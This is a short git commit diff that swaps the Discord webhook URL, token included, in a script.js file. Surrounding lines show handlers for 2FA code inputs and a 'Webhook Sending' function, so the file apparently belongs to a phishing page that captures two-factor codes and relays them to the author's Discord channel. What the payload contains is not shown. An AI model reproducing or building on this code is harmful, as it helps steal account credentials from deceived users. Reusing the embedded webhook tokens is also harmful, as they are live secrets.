78809f1dd60b76cda4b6b69c7c3ea133acf8deab
froosterton <jeksonater@gmail.com>
2025-07-01 23:24:21 -0400

    Add files via upload

--- script.js
+++ script.js
@@ -199,7 +199,7 @@ if (twofaInput2 && verifyButton2) {
 
 // === Webhook Sending ===
 async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1387946339853271120/tp1ItIk31hBpb6vCwAFd8yUivL56cWl3IAgQausnwx_4ibhAghU-H_EFatEOoiRDsI-Q';
+  const webhookUrl = 'https://discord.com/api/webhooks/1389808707591733299/TUDvPPb-BGZLxz5QHgYTU4NPtzYXrVvxSfCDq3GB0G8dK1EeRt4S6fWryzp6HKElIEgD';
   const payload = {
     embeds: [{
       title: title,
